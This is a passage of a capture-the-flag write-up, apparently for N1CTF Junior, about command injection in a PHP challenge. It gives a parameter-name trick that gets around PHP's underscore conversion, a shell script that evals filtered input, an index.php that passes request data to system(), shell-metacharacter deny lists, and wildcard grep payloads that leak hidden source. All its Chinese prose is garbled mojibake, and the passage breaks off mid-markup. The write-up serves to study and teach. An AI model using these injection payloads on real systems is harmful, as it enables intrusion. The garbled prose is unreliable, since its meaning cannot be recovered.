txt">å½“PHPç‰ˆæœ¬å°äº8æ—¶ï¼Œå¦‚æœå‚æ•°ä¸­å‡ºç°ä¸­æ‹¬å·[ï¼Œä¸­æ‹¬å·ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿_ï¼Œä½†æ˜¯ä¼šå‡ºç°è½¬æ¢é”™è¯¯å¯¼è‡´æ¥ä¸‹æ¥å¦‚æœè¯¥å‚æ•°åä¸­è¿˜æœ‰éæ³•å­—ç¬¦å¹¶ä¸ä¼šç»§ç»­è½¬æ¢æˆä¸‹åˆ’çº¿_ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸­æ‹¬å·[å‡ºç°åœ¨å‰é¢ï¼Œé‚£ä¹ˆä¸­æ‹¬å·[è¿˜æ˜¯ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿_ï¼Œä½†æ˜¯å› ä¸ºå‡ºé”™å¯¼è‡´æ¥ä¸‹æ¥çš„éæ³•å­—ç¬¦å¹¶ä¸ä¼šè¢«è½¬æ¢æˆä¸‹åˆ’çº¿_<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥åªè¦å°†å…¶ä¸­ä¸€ä¸ª_å˜ä¸º[ï¼Œå°±å¯ä»¥è¿›è¡Œä¼ å‚ï¼Œä½†æ˜¯é€šè¿‡æµ‹è¯•ï¼Œå‘ç°å­—ç¬¦ä¸²å¼€å¤´çš„_ä¸èƒ½ä¸º[ï¼Œä½†æ˜¯ç¬¬äºŒä¸ª_å¯ä»¥ç”¨[ï¼Œæ›¿æ¢ï¼Œå¯ä»¥å¾—åˆ°å†…å®¹å›æ˜¾(é¢˜ç›®ç¯å¢ƒæ˜¯php&lt;8):</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=ls #ä¸€èˆ¬å…ˆå°è¯•ä¸€ä¸‹lså¯ä¸å¯ä»¥<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240211232537082.png" alt="image-20240211232537082"></p><h3 id="è·å–execute-shæ–‡ä»¶"><a href="#è·å–execute-shæ–‡ä»¶" class="headerlink" title="è·å–execute.shæ–‡ä»¶:"></a>è·å–execute.shæ–‡ä»¶:</h3><p><strong>.shæ–‡ä»¶ç›´æ¥è®¿é—®æ—¶å¯ä»¥ç›´æ¥è¢«ç½‘é¡µä¸‹è½½è·å–,æ‰€ä»¥ä»¥åä¸€äº›é™Œç”Ÿæˆ–å¯ç–‘æ–‡ä»¶åœ¨çŸ¥é“å…¶ç›®å½•çš„æƒ…å†µä¸‹ï¼Œéƒ½å¯ä»¥è¿›è¡Œè®¿é—®ä¸€ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è¿›è¡Œä¸‹è½½è·å–</strong></p><p><img src="/images/2024-2-18/image-20240211232914394.png" alt="image-20240211232914394"></p><p><img src="/2024/02/18/2024-02-18-%E7%AC%AC%E4%BA%8C%E5%B1%8AN1CTF%20Junior_zako%E5%A4%8D%E7%8E%B0/Typora_images\image-20240211233257819.png" alt="image-20240211233257819"></p><h4 id="ä¸‹è½½è·å–åˆ°çš„execute-sh"><a href="#ä¸‹è½½è·å–åˆ°çš„execute-sh" class="headerlink" title="ä¸‹è½½è·å–åˆ°çš„execute.sh:"></a>ä¸‹è½½è·å–åˆ°çš„execute.sh:</h4><p>å°†å…¶åç¼€åå»æ‰ä»¥åè·å–åˆ°å®Œæ•´çš„ä»£ç </p><p><img src="/images/2024-2-18/image-20240211233451352.png" alt="image-20240211233451352"></p><h4 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡:"></a>ä»£ç å®¡è®¡:</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br> <br><span class="hljs-comment">#  å‡½æ•°å®šä¹‰</span><br><span class="hljs-comment"># $&#123;1&#125;ä¸ºè°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œä¼ ç»™è¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°</span><br><span class="hljs-function"><span class="hljs-title">reject</span></span>() &#123;<br>    <span class="hljs-comment"># è¾“å‡ºè°ƒç”¨è¯¥å‡½æ•°æ—¶ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span><br>    <span class="hljs-comment"># é€€å‡ºå½“å‰è„šæœ¬æ‰§è¡Œ&lt;=&gt;exit</span><br>    <span class="hljs-built_in">exit</span> 1<br>&#125;<br><br><span class="hljs-comment"># $1è¡¨ç¤ºæ‰§è¡Œå½“å‰è„šæœ¬ï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°</span><br>XXXCMD=<span class="hljs-variable">$1</span><br> <br>awk -v str=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string"># æ‰€è¦è¿›è¡Œæ‰§è¡Œçš„è„šæœ¬</span><br><span class="hljs-string">BEGIN &#123;</span><br><span class="hljs-string">    # å®šä¹‰é»‘åå•å­—ç¬¦</span><br><span class="hljs-string">    deny=&quot;`;&amp;$()&#123;&#125;[]!@#$%^&amp;*-&quot;;</span><br><span class="hljs-string">    for (i = 1; i &lt;= length(str); i++) &#123;</span><br><span class="hljs-string">        # è·å–strå­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šä½ç½®å­—ç¬¦</span><br><span class="hljs-string">        char = substr(str, i, 1);</span><br><span class="hljs-string">        for (x = 1; x &lt; length(deny) + 1; x++) &#123;</span><br><span class="hljs-string">            # è·å–denyå­—ç¬¦ä¸²æŒ‡å®šä½ç½®çš„å­—ç¬¦</span><br><span class="hljs-string">            r = substr(deny, x, 1);</span><br><span class="hljs-string">            # åˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨denyä¸­çš„å­—ç¬¦</span><br><span class="hljs-string">            # å¦‚æœæœ‰ï¼Œåˆ™é€€å‡ºç¨‹åº</span><br><span class="hljs-string">            if (char == r) exit 1;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&#x27;</span><br><span class="hljs-comment"># $?å­˜å‚¨äº†ä»¥ä¸Šä»£ç çš„é€€å‡ºç ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º0ï¼Œå¦‚æœä¸ä¸º0ï¼Œåˆ™ä¸ºçœŸï¼Œ&amp;&amp;ç»§ç»­æ‰§è¡Œå·¦è¾¹</span><br><span class="hljs-comment"># å¦‚æœé€€å‡ºç ä¸º0ï¼Œåˆ™è¾“å‡ºå‡ï¼Œ&amp;&amp;ä¸ç»§ç»­æ‰§è¡Œå·¦è¾¹</span><br><span class="hljs-comment"># reject &quot;NOT ALLOW 1&quot;ï¼Œå‘rejectå‡½æ•°ä¼ &quot;NOT ALLOW 1&quot;å­—ç¬¦ä¸²å‚æ•°</span><br>[ $? -ne 0 ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 1&quot;</span><br><br><span class="hljs-comment"># echo &quot;$&#123;XXXCMD&#125;&quot;ï¼šå°†æˆ‘ä»¬è¾“å…¥çš„cmd(å³XXXCMD)çš„å†…å®¹è¾“å‡ºç»™awkæ‰€æŒ‡å®šçš„è„šæœ¬ä¸­</span><br><span class="hljs-comment"># |ï¼šç®¡é“ç¬¦å¯ä»¥ä¾æ¬¡æ‰§è¡Œä»å·¦å¾€å³çš„å‘½ä»¤ï¼Œä¹Ÿå¯ä»¥å°†å·¦è¾¹å‘½ä»¤çš„å†…å®¹é€šè¿‡echoè¾“å‡ºç»™å³è¾¹å‘½ä»¤ä¸­</span><br><span class="hljs-comment"># awk -F &quot;|&quot;:å°†è·å¾—çš„cmdå†…å®¹ä»¥|è¿›è¡Œåˆ†å‰²ä¼ è¾“ç»™åé¢çš„è„šæœ¬æ¨¡å—</span><br><span class="hljs-comment"># $()ä¸­çš„æ•´ä¸ªä»£ç æ‰§è¡Œçš„ç»“æœèµ‹å€¼ç»™eval_cmdå‚æ•°</span><br>eval_cmd=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> | awk -F <span class="hljs-string">&quot;|&quot;</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string"># å¼€å§‹æ¨¡å—</span><br><span class="hljs-string">BEGIN &#123;</span><br><span class="hljs-string">    # ç™½åå•å†…å®¹</span><br><span class="hljs-string">    allows[1] = &quot;ls&quot;;# å±•ç¤ºæŒ‡å®šç›®å½•çš„æ–‡ä»¶</span><br><span class="hljs-string">    allows[2] = &quot;makabaka&quot;;</span><br><span class="hljs-string">    allows[3] = &quot;whoareu&quot;;</span><br><span class="hljs-string">    allows[4] = &quot;cut~no&quot;;</span><br><span class="hljs-string">    allows[5] = &quot;grep&quot;;# æœç´¢æŒ‡å®šæ–‡ä»¶å†…å®¹ï¼Œè¾“å‡ºåŒ¹é…çš„å­—ç¬¦ä¸²æ‰€åœ¨è¡Œçš„å†…å®¹</span><br><span class="hljs-string">    allows[6] = &quot;wc&quot;;# æŸ¥çœ‹æ–‡ä»¶è¡Œæ•°æƒ…å†µï¼Œä¸å¯ä»¥è¯»å–å†…å®¹</span><br><span class="hljs-string">    allows[7] = &quot;æ‚é±¼æ‚é±¼&quot;;</span><br><span class="hljs-string">    allows[8] = &quot;netstat.jpg&quot;;</span><br><span class="hljs-string">    allows[9] = &quot;awsl&quot;;</span><br><span class="hljs-string">    allows[10] = &quot;dmesg&quot;;</span><br><span class="hljs-string">    allows[11] = &quot;xswl&quot;;</span><br><span class="hljs-string">&#125;&#123;</span><br><span class="hljs-string">    # è¿™ä¸ªæ¨¡å—çš„ä½œç”¨å°±æ˜¯åˆ¤æ–­æˆ‘ä»¬çš„å‘½ä»¤æ˜¯å¦åœ¨ç™½åå•ä¸­ï¼Œåœ¨ç™½åå•ä¸­åˆ™å¯ä»¥è¢«å­˜å‚¨åˆ°eval_cmdæ•°ç»„ä¸­</span><br><span class="hljs-string">    num = 1;</span><br><span class="hljs-string">    # NF è¡¨ç¤ºå­—æ®µæ•°é‡ï¼Œå³è¾“å…¥è„šæœ¬çš„å­—æ®µçš„æ•°é‡</span><br><span class="hljs-string">    # $iè¡¨ç¤ºè¾“å…¥çš„ç¬¬iä¸ªå‚æ•°çš„å€¼ï¼Œè¿™é‡Œå­—ç¬¦ä¸²è¢«|åˆ†å‰²ä¸ºå„ä¸ªå­—æ®µè¾“å…¥ï¼Œæ‰€ä»¥å°±è¡¨ç¤ºç¬¬iä¸ªå­—æ®µçš„å€¼</span><br><span class="hljs-string">    for (i = 1; i &lt;= NF; i++) &#123;</span><br><span class="hljs-string">        for (x = 1; x &lt;= length(allows); x++) &#123;</span><br><span class="hljs-string">            cmpstr = substr($i, 1, length(allows[x]));</span><br><span class="hljs-string">            if (cmpstr == allows[x])</span><br><span class="hljs-string">                eval_cmd[num++] = $i;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"># ç»“æŸæ¨¡å—</span><br><span class="hljs-string">END &#123;</span><br><span class="hljs-string">    # ç”±äºæ¨¡å—è¿è¡Œç»“æŸæ‰ä¼šè°ƒç”¨$()è¿›è¡Œèµ‹å€¼ï¼Œæ‰€ä»¥å½“æœ€åè¿è¡Œå®Œæ¯•åä¸ºï¼šå‘½ä»¤1| å‘½ä»¤2| å‘½ä»¤3| ......</span><br><span class="hljs-string">    # ç„¶åå°†æœ€ç»ˆçš„æ‰“å°ç»“æœèµ‹å€¼ç»™eval_cmd</span><br><span class="hljs-string">    for (i = 1; i &lt;= length(eval_cmd); i++) &#123;</span><br><span class="hljs-string">        if (i != 1)</span><br><span class="hljs-string">            # è¾“å‡ºç¬¬ä¸€ä¸ªä¹‹åçš„å‘½ä»¤ä¸”å¸¦ä¸Šç®¡é“ç¬¦ï¼Œä¿è¯å…è®¸çš„å‘½ä»¤éƒ½èƒ½å¤Ÿæ‰§è¡Œ</span><br><span class="hljs-string">            printf &quot;| %s&quot;, eval_cmd[i];</span><br><span class="hljs-string">        else</span><br><span class="hljs-string">            # è¾“å‡ºç¬¬ä¸€ä¸ªå‘½ä»¤</span><br><span class="hljs-string">            printf &quot;%s&quot;, eval_cmd[i];</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">&#125;&#x27;</span><br>)<br><br><span class="hljs-comment"># åˆ¤æ–­æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°(cmd)æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™è°ƒç”¨reject &quot;NOT ALLOW 2&quot;</span><br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XXXCMD&#125;</span>&quot;</span> = <span class="hljs-string">&quot;&quot;</span> ] &amp;&amp; reject <span class="hljs-string">&quot;NOT ALLOW 2&quot;</span><br><br><span class="hljs-comment"># æ‰§è¡Œeval_cmdå‘½ä»¤</span><br><span class="hljs-built_in">eval</span> <span class="hljs-variable">$&#123;eval_cmd&#125;</span><br></code></pre></td></tr></table></figure><h3 id="index-phpä»£ç åˆ†æ"><a href="#index-phpä»£ç åˆ†æ" class="headerlink" title="index.phpä»£ç åˆ†æ:"></a>index.phpä»£ç åˆ†æ:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//something hide here</span><br><br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;__secret.xswl.io&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) &gt; <span class="hljs-number">70</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no, &gt; 70&quot;</span>);<br>&#125;<br><span class="hljs-comment">// è¿™é‡Œçš„elseå†…å®¹ä¸¢å¤±äº†ï¼Œæ ¹æ®æç¤ºsomething hide here</span><br><span class="hljs-comment">// è¯´æ˜è¯¥ä»£ç éƒ¨åˆ†è¢«éšè—äº†</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ å°±ä¸èƒ½ç»•ä¸€ä¸‹å–µ&quot;</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;./execute.sh &#x27;&quot;</span>.<span class="hljs-variable">$cmd</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç½‘é¡µä¸Šæ˜¾ç¤ºçš„ä»£ç å†…å®¹æ˜¯ä¸å®Œæ•´çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è·å–æºç æ‰èƒ½çŸ¥é“è¿‡æ»¤çš„å†…å®¹</p><h3 id="è·å–å®Œæ•´çš„index-phpä»£ç ï¼š"><a href="#è·å–å®Œæ•´çš„index-phpä»£ç ï¼š" class="headerlink" title="è·å–å®Œæ•´çš„index.phpä»£ç ï¼š"></a>è·å–å®Œæ•´çš„index.phpä»£ç ï¼š</h3><h4 id="åˆ©ç”¨wcæŸ¥çœ‹index-phpçš„æ–‡ä»¶è¡Œæ•°"><a href="#åˆ©ç”¨wcæŸ¥çœ‹index-phpçš„æ–‡ä»¶è¡Œæ•°" class="headerlink" title="åˆ©ç”¨wcæŸ¥çœ‹index.phpçš„æ–‡ä»¶è¡Œæ•°:"></a>åˆ©ç”¨wcæŸ¥çœ‹index.phpçš„æ–‡ä»¶è¡Œæ•°:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=wc index.php<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212010447345.png" alt="image-20240212010447345"></p><p>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹æœ‰è¿‡æ»¤ï¼Œå¯ä»¥ç”¨?æ›¿æ¢index.phpä¸­çš„ä¸€ä¸ªå­—ç¬¦å°è¯•ç»•è¿‡:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=wc inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212010716400.png" alt="image-20240212010716400"></p><p>å¾—åˆ°index.phpæ€»å…±æœ‰16è¡Œæ•°æ®</p><p><img src="/images/2024-2-18/image-20240212011045979.png" alt="image-20240212011045979"></p><p>ç½‘é¡µå®é™…æ˜¾ç¤ºçš„è¡Œæ•°ä¸º14è¡Œï¼Œå°‘äº†ä¸¤è¡Œã€‚</p><h3 id="ä½¿ç”¨grepè·å–ç¼ºå¤±è¡Œçš„å†…å®¹"><a href="#ä½¿ç”¨grepè·å–ç¼ºå¤±è¡Œçš„å†…å®¹" class="headerlink" title="ä½¿ç”¨grepè·å–ç¼ºå¤±è¡Œçš„å†…å®¹:"></a>ä½¿ç”¨grepè·å–ç¼ºå¤±è¡Œçš„å†…å®¹:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep -A 5 &quot;&#125;&quot; inde?.ph?<br>è·å–åŒ¹é…è¡ŒåŠå…¶åé¢çš„5è¡Œå†…å®¹<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212011727307.png" alt="image-20240212011727307"></p><p>ç»è¿‡æµ‹è¯•â€-â€œè¢«è¿‡æ»¤äº†ã€‚</p><h4 id="ç›´æ¥ä½¿ç”¨åŒ¹é…å­—ç¬¦ä¸²è·å–è¡Œå†…å®¹"><a href="#ç›´æ¥ä½¿ç”¨åŒ¹é…å­—ç¬¦ä¸²è·å–è¡Œå†…å®¹" class="headerlink" title="ç›´æ¥ä½¿ç”¨åŒ¹é…å­—ç¬¦ä¸²è·å–è¡Œå†…å®¹:"></a>ç›´æ¥ä½¿ç”¨åŒ¹é…å­—ç¬¦ä¸²è·å–è¡Œå†…å®¹:</h4><p><strong>ç”±äºç¼ºå°‘çš„æ˜¯elseæ¨¡å—å†…å®¹ï¼Œæ‰€ä»¥ç›´æ¥åŒ¹é…else</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;else&quot; inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212012022041.png" alt="image-20240212012022041"></p><p>æ²¡æœ‰å›æ˜¾å†…å®¹ã€‚</p><h4 id="çŸ¥è¯†ç‚¹ä»‹ç»"><a href="#çŸ¥è¯†ç‚¹ä»‹ç»" class="headerlink" title="çŸ¥è¯†ç‚¹ä»‹ç»:"></a>çŸ¥è¯†ç‚¹ä»‹ç»:</h4><h5 id="phpéšè—æ˜¾ç¤ºä»£ç "><a href="#phpéšè—æ˜¾ç¤ºä»£ç " class="headerlink" title="phpéšè—æ˜¾ç¤ºä»£ç :"></a>phpéšè—æ˜¾ç¤ºä»£ç :</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs txt">highlight_string(shell_exec(&quot;cat &quot;.__FILE__.&quot; | grep -v preg_match | grep -v highlight&quot;));<br><br>è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯å°†å½“å‰æ–‡ä»¶çš„å†…å®¹è¯»å–å¹¶ä½¿ç”¨ grep å‘½ä»¤è¿›è¡Œç­›é€‰ï¼Œç„¶åä½¿ç”¨ highlight_string å‡½æ•°å¯¹ç­›é€‰åçš„å†…å®¹è¿›è¡Œè¯­æ³•é«˜äº®ã€‚<br><br>è®©æˆ‘ä»¬é€æ­¥è§£æè¿™æ®µä»£ç ï¼š<br><br>__FILE__ æ˜¯ä¸€ä¸ªé­”æœ¯å¸¸é‡ï¼Œè¡¨ç¤ºå½“å‰æ–‡ä»¶çš„ç»å¯¹è·¯å¾„å’Œæ–‡ä»¶åã€‚<br><br>cat __FILE__ ä½¿ç”¨ cat å‘½ä»¤è¯»å–å½“å‰æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶é€šè¿‡ç®¡é“ | å°†å…¶ä¼ é€’ç»™ä¸‹ä¸€ä¸ªå‘½ä»¤ã€‚<br><br>grep -v preg_match æ˜¯ç¬¬ä¸€ä¸ª grep å‘½ä»¤ï¼Œä½¿ç”¨ -v é€‰é¡¹åè½¬åŒ¹é…ï¼Œå³åªè¾“å‡ºä¸åŒ¹é… &quot;preg_match&quot; çš„è¡Œã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†æ’é™¤å½“å‰æ–‡ä»¶ä¸­åŒ…å« &quot;preg_match&quot; çš„è¡Œã€‚<br><br>grep -v highlight æ˜¯ç¬¬äºŒä¸ª grep å‘½ä»¤ï¼ŒåŒæ ·ä½¿ç”¨ -v é€‰é¡¹åè½¬åŒ¹é…ï¼Œå³åªè¾“å‡ºä¸åŒ¹é… &quot;highlight&quot; çš„è¡Œã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†æ’é™¤å½“å‰æ–‡ä»¶ä¸­åŒ…å« &quot;highlight&quot; çš„è¡Œã€‚<br><br>æœ€åï¼Œshell_exec å‡½æ•°å°†æ•´ä¸ªå‘½ä»¤ä¸²è”èµ·æ¥ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤çš„ç»“æœå°†ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚<br><br>highlight_string å‡½æ•°æ¥å—ä¸€ä¸ªå­—ç¬¦ä¸²å‚æ•°ï¼Œå°†å…¶ä¸­çš„ PHP ä»£ç è¿›è¡Œè¯­æ³•é«˜äº®å¤„ç†ï¼Œå¹¶å°†ç»“æœè¾“å‡ºåˆ°æµè§ˆå™¨æˆ–ç»ˆç«¯ã€‚<br><br>æ€»ç»“èµ·æ¥ï¼Œè¿™æ®µä»£ç çš„ä½œç”¨æ˜¯è¯»å–å½“å‰æ–‡ä»¶çš„å†…å®¹ï¼Œæ’é™¤åŒ…å« &quot;preg_match&quot; å’Œ &quot;highlight&quot; çš„è¡Œï¼Œç„¶åå¯¹å‰©ä½™çš„ä»£ç è¿›è¡Œè¯­æ³•é«˜äº®å¤„ç†ï¼Œå¹¶å°†ç»“æœè¾“å‡ºåˆ°è®¾å¤‡ä¸Šã€‚è¿™å¯èƒ½æ˜¯ç”¨äºå±•ç¤ºå½“å‰æ–‡ä»¶çš„ä»£ç ï¼Œå¹¶åœ¨å…¶ä¸­çªå‡ºæ˜¾ç¤ºä¸åŒ…å«ç‰¹å®šå‡½æ•°çš„éƒ¨åˆ†ã€‚<br><br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç›´æ¥æ‰§è¡Œç”¨æˆ·è¾“å…¥çš„å‘½ä»¤å¯èƒ½å­˜åœ¨å®‰å…¨é£é™©ï¼Œå› æ­¤åœ¨å®é™…åº”ç”¨ä¸­åº”è¯¥è°¨æ…ä½¿ç”¨ï¼Œå¹¶ç¡®ä¿è¾“å…¥çš„å‘½ä»¤æ˜¯å¯ä¿¡çš„ã€‚<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥åŒ¹é…highlight_stringå»è·å–è¢«éšè—çš„åŒ¹é…å­—ç¬¦ä¸²ã€‚</p><h4 id="è·å–highlight-stringä»£ç "><a href="#è·å–highlight-stringä»£ç " class="headerlink" title="è·å–highlight_stringä»£ç :"></a>è·å–highlight_stringä»£ç :</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;highl&quot; inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212012613893.png" alt="image-20240212012613893"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">highlight_string(shell_exec(&quot;cat &quot;.__FILE__.&quot; | grep -v preg_match | grep -v highlight&quot;)); <br></code></pre></td></tr></table></figure><p>éšè—çš„æ˜¯preg_matchå’Œhighlightæ‰€åœ¨è¡Œã€‚</p><h4 id="åŒ¹é…preg-matchæ‰€åœ¨è¡Œå†…å®¹"><a href="#åŒ¹é…preg-matchæ‰€åœ¨è¡Œå†…å®¹" class="headerlink" title="åŒ¹é…preg_matchæ‰€åœ¨è¡Œå†…å®¹:"></a>åŒ¹é…preg_matchæ‰€åœ¨è¡Œå†…å®¹:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?_[secret.xswl.io=grep &quot;preg&quot; inde?.ph?<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-18/image-20240212012755215.png" alt="image-20240212012755215"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">highlight_string(shell_exec(&quot;cat &quot;.__FILE__.&quot; | grep -v preg_match | grep -v highlight&quot;)); if (preg_match(&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;,$cmd))&#123; <br></code></pre></td></tr></table></figure><h4 id="ç¼ºå¤±çš„è¡Œå†…å®¹"><a href="#ç¼ºå¤±çš„è¡Œå†…å®¹" class="headerlink" title="ç¼ºå¤±çš„è¡Œå†…å®¹:"></a>ç¼ºå¤±çš„è¡Œå†…å®¹:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">highlight_string(shell_exec(&quot;cat &quot;.__FILE__.&quot; | grep -v preg_match | grep -v highlight&quot;)); <br>if (preg_match(&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||-|_|\\=|\\*|!|\\%|\\\^|index|execute&#x27;)/is&quot;,$cmd))&#123; <br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´çš„index-php"><a href="#å®Œæ•´çš„index-php" class="headerlink" title="å®Œæ•´çš„index.php:"></a>å®Œæ•´çš„index.php:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 